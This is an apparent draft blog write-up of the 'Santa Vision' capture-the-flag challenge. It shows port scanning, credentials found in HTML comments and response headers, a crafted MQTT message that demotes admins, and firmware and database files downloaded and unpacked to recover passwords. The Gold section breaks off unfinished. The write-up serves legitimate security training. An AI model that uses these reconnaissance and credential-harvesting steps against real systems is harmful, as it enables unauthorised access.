+++
title = 'Santa Vision'
date = 2024-12-14T14:53:58+01:00
draft = true
weight = 2
+++

## Objective

> Alabaster and Wombley have poisoned the Santa Vision feeds! Knock them out to restore everyone back to their regularly scheduled programming.

## Hints

Ribb Bonbowford (The Front Yard (Act 3))
> Hi, Ribb Bonbowford here, ready to guide you through the SantaVision dilemma!
> 
> The Santa Broadcast Network (SBN) has been hijacked by Wombley's goons—they're using it to spread propaganda and recruit elves! And Alabaster joined in out of necessity. Quite the predicament, isn’t it?
> 
> To access this challenge, use this terminal to access your own instance of the SantaVision infrastructure.
> 
> Once it's done baking, you'll see an IP address that you'll need to scan for listening services.
>
> Our target is the technology behind the SBN. We need make a key change to its configuration.
> 
> We’ve got to remove their ability to use their admin privileges. This is a delicate maneuver—are you ready?
>
> We need to change the application so that multiple administrators are not permitted. A misstep could cause major issues, so precision is key.
> 
> Once that’s done, positive, cooperative images will return to the broadcast. The holiday spirit must prevail!
>
> This means connecting to the network and pinpointing the right accounts. Don’t worry, we'll get through this.
> 
> Let’s ensure the broadcast promotes unity among the elves. They deserve to see the season’s spirit, don't you think?
> 
> Remember, it’s about cooperation and togetherness. Let's restore that and bring back the holiday cheer. Best of luck!
> 
> The first step to unraveling this mess is gaining access to the SantaVision portal. You'll need the right credentials to slip through the front door—what username will get you in?

## Solution

### Silver

#### Santa vision A

> What username logs you into the SantaVision portal?

```bash
nmap -sS 34.72.28.246 -p 1-65535
```

Output

| PORT      | STATE    | SERVICE     | 
| --------- | -------- | ----------- | 
| 22/tcp    | open     | ssh         |
| 25/tcp    | filtered | smtp        |
| 1883/tcp  | open     | mqtt        |
| 5355/tcp  | filtered | llmnr       |
| 8000/tcp  | open     | http-alt    |
| 9001/tcp  | open     | tor-orport  |
| 18290/tcp | filtered | unknown     |
| 48328/tcp | filtered | unknown     |

Inspecting the HTML code on the landing page ```34.67.56.14:8000``` I found what seems like a ```mqtt``` credential:

```html
<div class="footer" id="footer">
  <b>©2024 Santavision Elventech Co., Ltd. Snow Rights Reserved.<br>(<i>topic 'sitestatus'</i> available.)</b>
</div> <!-- mqtt: elfanon:elfanon -->

      </div>
    </div>
    <!-- scripts -->
    <script src="https://code.jquery.com/jquery-3.6.1.min.js" type="text/javascript"></script>
    <!-- JavaScript Bundle with Popper -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-A3rJD856KowSb7dwlZdYEkO39Gagi7vIsF0jrRAoQmDKKtQBHUuLZ9AsSv4jD4Xa" crossorigin="anonymous"></script>
    
  </body>
</html>
```

Answer:

```
elfanon:elfanon
```

Login: 

![Login](/images/act3/act3-santa-vision-1.png)

#### Santa vision B

> Once logged on, authenticate further without using Wombley's or Alabaster's accounts to see the northpolefeeds on the monitors. What username worked here?

Clicking on the "List Available Clients" button, I got this output:

```json
Available clients: 'elfmonitor', 'WomblyC', 'AlabasterS'
```

Clicking on the "List Available Roles" button, I got this output:

```json
Available roles: 'SiteDefaultPasswordRole', 'SiteElfMonitorRole', 'SiteAlabsterSAdminRole', 'SiteWomblyCAdminRole'
```

In order to find the answer I tried to make a connection using MQTTX, trying various combination until landing on:

```
elfmonitor:SiteElfMonitorRole
```

Turning on the monitors:

![Login](/images/act3/act3-santa-vision-2.png)

#### Santa vision C

> Using the information available to you in the SantaVision platform, subscribe to the frostbitfeed MQTT topic. Are there any other feeds available? What is the code name for the elves' secret operation?


From Santafeed: 
```bash
Topic: santafeedQoS: 0
Sixteen elves launched operation: Idemcerybu
```

Connect to MQTT using MQTTX: 

![Connecting](/images/act3/act3-santa-vision-3.png)

Finding the name of the secret operation in the "santafeed":

![Findind the name of the secret operation](/images/act3/act3-santa-vision-4.png)

Name of the secret operation:

```
Idemcerybu
```

#### Santa vision D

> There are too many admins. Demote Wombley and Alabaster with a single MQTT message to correct the northpolefeeds feed. What type of contraption do you see Santa on?

Feeds:

* frostbitfeed
* northpolefeeds
* santafeed


Send as Plaintext to Santafeed using the Html form:

```html
singleAdminMode=true&role=SiteElfMonitorRole&user=WombleyC
```

![Findind the name of the secret operation](/images/act3/act3-santa-vision-5.png)


Answer:

```
pogo stick
```

### Gold

#### Santa vision A

I found a new topic by using BurpSuite navigating to the logon form site:

* sitestatus

By listening in on the logon process using BurpSuite I found a direct link for login:

```
<p>You should be redirected automatically to the target URL: <a href="/auth?id=viewer&amp;loginName=elfanon">/auth?id=viewer&amp;loginName=elfanon</a>. If not, click the link.
```

Investigating further on the ```sitestatus``` feed I found an interesting download:

![Interesting download](/images/act3/act3-santa-vision-6.png)

```
/static/sv-application-2024-SuperTopSecret-9265193/applicationDefault.bin
```

On Kali, downloaded the file: 

```bash
wget http://34.72.28.246:8000/static/sv-application-2024-SuperTopSecret-9265193/applicationDefault.bin
```

Investigating what it is: 

```bash
file applicationDefault.bin
    applicationDefault.bin: Linux jffs2 filesystem data little endian
```

According to the hints, we can use Jefferson to treat this file (including here the instruction setting it up):

```bash
python3 -m venv env
source env/bin/activate
pip install -U pip
pip install jefferson
```

Using Jefferson, extracting results to folder "out":

```bash
jefferson -d out applicationDefault.bin
```


In file ```out/app/src/accounts/views.py``` I found a reference to a SQLite database:

```python
@accounts_bp.route("/static/sv-application-2024-SuperTopSecret-9265193/applicationDefault.bin", methods=["GET"])
def firmware():
    return send_from_directory("static", "sv-application-2024-SuperTopSecret-9265193/applicationDefault.bin", as_attachment=True)

@accounts_bp.route("/sv2024DB-Santa/SantasTopSecretDB-2024-Z.sqlite", methods=["GET"])
def db():
    return send_from_directory("static", "sv2024DB-Santa/SantasTopSecretDB-2024-Z.sqlite", as_attachment=True)
```

Downloading the SQLite database: 

```bash
wget http://34.72.28.246:8000/sv2024DB-Santa/SantasTopSecretDB-2024-Z.sqlite
```

Opened it up in ```sqlitebrowser``` and found a user table: 

![User table](/images/act3/act3-santa-vision-7.png)

The credentials for gold in A is: 

```
santaSiteAdmin:S4n+4sr3411yC00Lp455wd
```

#### Santa vision B

While inspecting the HTTPS headers for the monitoring GUI, I found something interesting for call 

```
http://34.30.225.171:8000/auth?id=viewer&loginName=santaSiteAdmin
```

It appears that there's some credentials hidden in the response headers:

![Hidden username in headers](/images/act3/act3-santa-vision-8.png)

Found:

```
santashelper2024:playerSantaHelperPass7183926777
```

Note: the password changes whenever the environment is reset ...

#### Santa vision C

#### Santa vision D